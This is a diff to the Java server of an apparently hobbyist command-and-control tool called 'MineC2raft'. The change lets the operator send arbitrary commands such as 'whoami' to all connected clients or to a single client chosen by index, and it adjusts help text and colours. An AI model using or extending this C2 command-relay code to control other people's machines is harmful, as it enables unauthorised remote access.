@@ -65,8 +65,8 @@ public class Server {
         System.out.println(YELLOW + "Type 'coms' for a list of commands." + RESET);
 
         while((userIn = userReader.readLine()) != null && !userIn.equals("quit")) {
-            
             commandHandler(userIn);
+
         }
     }    
 
@@ -76,7 +76,6 @@ public class Server {
      * @param cmd - the user input.
      */
     public static void commandHandler(String cmd) {
-        System.out.println(GREEN + "Start of broadcast: " + RESET + "\n");
         String reply;
         switch(cmd) {
             case "os", "version":
@@ -87,7 +86,7 @@ public class Server {
                 reply = "whoami";
                 broadcast(reply, null);
                 break;
-            case "coms", "commands", "cmd", "cmds", "HELP": 
+            case "coms", "commands", "cmds", "HELP": 
                 reply = "               ********** MineC2raft Commands ***********\n\t\t" 
                             + "os: displays the os of the client.\n\t\t"
                             + "user: displays the name of the client.\n\t\t" 
@@ -99,13 +98,13 @@ public class Server {
                             + "Thats all you need to know foo\n\t\t";
 
                 System.out.println(reply);
-                System.out.println("\n" + "\u001B[31m" + "Broadcast Complete." + "\u001B[0m");
+                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                 break;
             case "poop":
                 for(int i = 1; i <= 100; i++) {
                     System.out.println(i + ": Poop");
                 }
-                System.out.println("\n" + "\u001B[31m" + "Broadcast Complete." + "\u001B[0m");
+                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                 break;
             case "about", "abt":
                 reply = "\n░▒▓ MINEC2RAFT ▓▒░\n" 
@@ -114,16 +113,31 @@ public class Server {
                         + "For fun too lowk...\n\n" 
                         + "A dud?\n/give @p minecraft:command_block";
                 System.out.println(reply);
-                System.out.println("\n" + "\u001B[31m" + "Broadcast Complete." + "\u001B[0m");
+                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                 break;
             case "sockets", "clients", "list", "lst", "array", "arr":
                 formatArrLst(); 
-                System.out.println("\n" + "\u001B[31m" + "Broadcast Complete." + "\u001B[0m");
+                System.out.println("\n" + YELLOW  + "Broadcast Complete." + "\u001B[0m");
                 break;                
             default: 
                 broadcast(cmd, null);
                 break;  
         }
+    }
+
+    public static String broadcastDestinationHandler() {
+        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
+        String response;
+        formatArrLst();
+        System.out.println("all: broadcast to all clients");
+        try {
+            response = reader.readLine();
+            return response;
+        } catch(IOException e) {
+
+        }
+        return null;
+       
     }
 
     /** 
@@ -134,21 +148,39 @@ public class Server {
         if(msg == null || msg.trim().isEmpty() || msg.equals("__END__")) {
             return;
         }
-        for(ClientHandler client : clients) {
-            if (client != sender) {
-                client.sendMessage("CMD: " + msg);
+        if(clients.isEmpty()) {
+            System.out.println(RED + "No clients connected." + RESET);
+            return;
+        }
+        System.out.println("\nWhere do you want to send this command?");
+        String response = broadcastDestinationHandler();
+        if(response != null) {
+            if(response.equals("all")) {
+                for(ClientHandler client : clients) {
+                    if (client != sender) {
+                        client.sendMessage("CMD: " + msg);
+                    }
+                }
+            } else {
+                try {
+                    clients.get(Integer.parseInt(response)).sendMessage("CMD: " + msg);
+                } catch(NumberFormatException e) {
+                    System.out.println("Not a valid option.");
+                }
             }
         }
+
+       
     }
 
     public static void formatArrLst() {
         if(clients.size() > 0) {
-            System.out.println("Current Connected Clients: ");
+            System.out.println(GREEN + "\nCurrent Connected Clients:" + RESET);
         } else {
-            System.out.println("No connected clients. ");
+            System.out.println(RED + "No connected clients. " + RESET);
         }
-        for(ClientHandler elements : clients) {
-            System.out.println(elements.getInetAddr() + ", Port " + elements.getPort());
+        for(int i = 0; i < clients.size(); i++) {
+            System.out.println(YELLOW + i + ": " + RESET + clients.get(i).getInetAddr() + ", Port " + clients.get(i).getPort());
         }
     }
 
